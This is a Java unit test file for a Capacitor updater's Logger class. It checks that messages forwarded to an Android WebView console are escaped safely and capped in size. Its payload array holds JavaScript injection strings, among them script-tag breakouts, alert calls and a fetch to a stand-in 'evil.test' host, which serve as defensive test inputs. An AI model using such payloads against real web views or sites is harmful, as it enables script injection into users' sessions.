package ee.forgr.capacitor_updater;

import static org.junit.Assert.*;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.*;

import android.webkit.WebView;
import com.getcapacitor.Bridge;
import org.json.JSONArray;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.mockito.ArgumentCaptor;
import org.robolectric.RobolectricTestRunner;

@RunWith(RobolectricTestRunner.class)
public class LoggerSecurityTest {

    private static final String[] INJECTION_PAYLOADS = {
        "hello\");alert(1)//",
        "line\nbreak",
        "`backtick`",
        "</script><script>alert(1)</script>",
        "back\\slash",
        "line\u2028separator",
        "para\u2029graph",
        "{\"error\":\"Internal Server Error\",\"detail\":\"');fetch('https://evil.test')//\"}",
        "HTTP/1.1 500\r\n\r\n<script>alert(1)</script>"
    };

    @Test
    public void toJsStringLiteral_escapesQuotesNewlinesBackslashesAndLineSeparators() throws org.json.JSONException {
        for (String payload : INJECTION_PAYLOADS) {
            assertRoundTripJsStringLiteral(payload);
        }
    }

    @Test
    public void buildWebViewConsoleScript_usesAllowlistedConsoleMethodsOnly() {
        assertEquals(
            "console.error(" + Logger.toJsStringLiteral("[CapgoUpdater] test") + ")",
            Logger.buildWebViewConsoleScript(Logger.LogLevel.error, "CapgoUpdater", "test")
        );
        assertEquals(
            "console.warn(" + Logger.toJsStringLiteral("[CapgoUpdater] test") + ")",
            Logger.buildWebViewConsoleScript(Logger.LogLevel.warn, "CapgoUpdater", "test")
        );
        assertEquals(
            "console.info(" + Logger.toJsStringLiteral("[CapgoUpdater] test") + ")",
            Logger.buildWebViewConsoleScript(Logger.LogLevel.info, "CapgoUpdater", "test")
        );
        assertEquals(
            "console.debug(" + Logger.toJsStringLiteral("[CapgoUpdater] test") + ")",
            Logger.buildWebViewConsoleScript(Logger.LogLevel.debug, "CapgoUpdater", "test")
        );
        assertNull(Logger.buildWebViewConsoleScript(Logger.LogLevel.silent, "CapgoUpdater", "test"));
    }

    @Test
    public void buildWebViewConsoleScript_escapesTagAndMessagePayloads() throws Exception {
        for (String payload : INJECTION_PAYLOADS) {
            String script = Logger.buildWebViewConsoleScript(Logger.LogLevel.error, "tag\");alert(1)//", payload);
            assertNotNull(script);
            assertSafeConsoleScript(script, "error", "[tag\");alert(1)//] " + payload);
        }
    }

    @Test
    public void logWithTagAtLevel_forwardsEscapedScriptToBridgeEval() throws org.json.JSONException {
        Bridge bridge = mock(Bridge.class);
        WebView webView = mock(WebView.class);
        when(bridge.getWebView()).thenReturn(webView);

        Logger logger = new Logger("CapgoUpdater", new Logger.Options(Logger.LogLevel.debug));
        logger.setBridge(bridge);

        String maliciousTag = "evil\");alert(1)//";
        String maliciousMessage = "hello\");alert(1)//";
        logger.logWithTagAtLevel(Logger.LogLevel.error, "", maliciousTag, maliciousMessage);

        ArgumentCaptor<String> scriptCaptor = ArgumentCaptor.forClass(String.class);
        verify(bridge).eval(scriptCaptor.capture(), eq(null));

        assertSafeConsoleScript(scriptCaptor.getValue(), "error", "[" + maliciousTag + "] 🔴 " + maliciousMessage);
    }

    @Test
    public void capWebViewLogPayload_truncatesOversizedMessages() {
        String oversized = "x".repeat(Logger.MAX_WEBVIEW_LOG_PAYLOAD_CHARS + 10);
        String capped = Logger.capWebViewLogPayload(oversized);

        assertTrue(capped.endsWith("..."));
        assertTrue(capped.getBytes(java.nio.charset.StandardCharsets.UTF_8).length <= Logger.MAX_WEBVIEW_LOG_PAYLOAD_CHARS + 3);
    }

    @Test
    public void capWebViewLogPayload_preservesValidUtf8BoundariesForCombiningMarks() {
        String combiningMarkPayload = "\u0301".repeat(Logger.MAX_WEBVIEW_LOG_PAYLOAD_CHARS + 10);
        String capped = Logger.capWebViewLogPayload(combiningMarkPayload);

        assertTrue(capped.endsWith("..."));
        assertNotNull(capped.getBytes(java.nio.charset.StandardCharsets.UTF_8));
    }

    private void assertSafeConsoleScript(String script, String consoleMethod, String expectedPayload) throws org.json.JSONException {
        String expectedScript = "console." + consoleMethod + "(" + Logger.toJsStringLiteral(expectedPayload) + ")";
        assertEquals(expectedScript, script);

        String quotedArg = script.substring(("console." + consoleMethod + "(").length(), script.length() - 1);
        String decodedPayload = new JSONArray("[" + quotedArg + "]").getString(0);
        assertEquals(expectedPayload, decodedPayload);
    }

    private void assertRoundTripJsStringLiteral(String value) throws org.json.JSONException {
        String quoted = Logger.toJsStringLiteral(value);
        assertTrue(quoted.startsWith("\""));
        assertTrue(quoted.endsWith("\""));
        assertEquals(value, new JSONArray("[" + quoted + "]").getString(0));
    }
}
